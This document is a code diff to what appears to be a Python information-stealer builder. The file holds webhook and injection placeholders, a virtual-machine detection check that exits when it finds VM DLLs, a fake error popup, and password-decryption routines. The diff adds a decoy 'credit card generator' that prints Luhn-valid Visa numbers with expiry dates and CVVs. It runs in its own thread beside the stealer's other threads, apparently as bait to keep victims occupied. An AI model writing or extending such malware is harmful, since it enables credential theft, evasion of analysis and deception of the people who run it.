@@ -17,11 +17,13 @@ from json import loads, dumps, load, dump
 from pathlib import Path
 from locale import windows_locale
 from importlib import import_module
+import datetime
 
 debug = '%Debug%'
 webhook = '%Webhook%'
 FakeWebhook = '%FakeWebhook%'
 Fakegen = '%FakeGen%' 
+FakeCCgen = '%FakeCCGen%' 
 FakeError = '%FakeError%' 
 
 injection = '%Injection%'
@@ -199,6 +201,63 @@ def check_dll():
     if os.path.exists(os.path.join(sys_root, "System32\\vmGuestLib.dll")) or os.path.exists(os.path.join(sys_root, "vboxmrxnp.dll")):
         exit_program('Strange dll detected!')
 
+card_data = {
+    'Visa': {
+        'iinRanges': ['4'],
+        'lengths': [13, 16]
+    },
+    'Visa Electron': {
+        'iinRanges': ['4026', '417500', '4508', '4844', '4913', '4917'],
+        'lengths': [16]
+    }
+}
+
+def luhn_check(card_number):
+    def digits_of(n):
+        return [int(d) for d in str(n)]
+
+    digits = digits_of(card_number)
+    odd_digits = digits[-1::-2]
+    even_digits = digits[-2::-2]
+    checksum = sum(odd_digits + [sum(divmod(d * 2, 10)) for d in even_digits])
+    return checksum % 10 == 0
+
+def generate_credit_card(attempt=1):
+    max_attempts = 100
+    if attempt > max_attempts:
+        raise ValueError(f"Unable to generate a valid Visa card number after {max_attempts} attempts.")
+
+    card_info = card_data['Visa']
+    iin_range = random.choice(card_info['iinRanges'])
+    length = random.choice(card_info['lengths'])
+    card_number = generate_card_number(iin_range, length)
+
+    if luhn_check(card_number):
+        expiry_date = generate_expiry_date()
+        cvv = generate_cvv()
+        return f"{card_number}|{expiry_date}|{cvv}"
+    else:
+        return generate_credit_card(attempt + 1)
+
+def generate_card_number(iin_range, length):
+    card_number = iin_range
+    remaining_length = length - len(iin_range)
+    for _ in range(remaining_length):
+        card_number += str(random.randint(0, 9))
+    return card_number
+
+def generate_cvv():
+    cvv_length = 3  
+    cvv = ''
+    for _ in range(cvv_length):
+        cvv += str(random.randint(0, 9))
+    return cvv
+
+def generate_expiry_date():
+    current_year = datetime.datetime.now().year
+    year = current_year + random.randint(1, 5)
+    month = str(random.randint(1, 12)).zfill(2)
+    return f'{month}/{str(year)[-2:]}'
 
 def webhook_tools():
     try:
@@ -316,6 +375,33 @@ def fakegen():
 
 def fakeError():
     ctypes.windll.user32.MessageBoxW(None, 'An unexpected error occurred while processing the data. Error code: 0x87D00325', 'Fatal Error', 0)
+
+def fakeccgen():
+    try:
+        time.sleep(1)
+        clear_command_prompt()
+        print('''
+░█████╗░░█████╗░░██████╗░███████╗███╗░░██╗
+██╔══██╗██╔══██╗██╔════╝░██╔════╝████╗░██║
+██║░░╚═╝██║░░╚═╝██║░░██╗░█████╗░░██╔██╗██║
+██║░░██╗██║░░██╗██║░░╚██╗██╔══╝░░██║╚████║
+╚█████╔╝╚█████╔╝╚██████╔╝███████╗██║░╚███║
+░╚════╝░░╚════╝░░╚═════╝░╚══════╝╚═╝░░╚══╝
+        ''')
+
+        while True:
+            essay = input("How many credit cards do you want to generate? (Enter a number): ")
+            if not essay.isdigit() or int(essay) < 1:
+                print("Invalid input. Please enter a positive integer.")
+                continue
+            essay = int(essay)
+
+            for _ in range(essay):
+                visa_card = generate_credit_card()
+                print(visa_card)
+
+    except Exception as e:
+        print(f"An error occurred: {e}")
 
 
 def DecryptValue(Buffer, master_key=None):
@@ -3328,11 +3414,16 @@ def gatha():
         us = threading.Thread(target=fakegen)
         us.start()
         First_Thread.append(us)
+
     if FakeError == True:
         fe = threading.Thread(target=fakeError)
         fe.start()
         First_Thread.append(fe)
 
+    if FakeCCgen == True:
+        fcc = threading.Thread(target=fakeccgen)
+        fcc.start()
+        First_Thread.append(fcc)
 
     if FakeWebhook == True:
         wb = threading.Thread(target=webhook_tools)
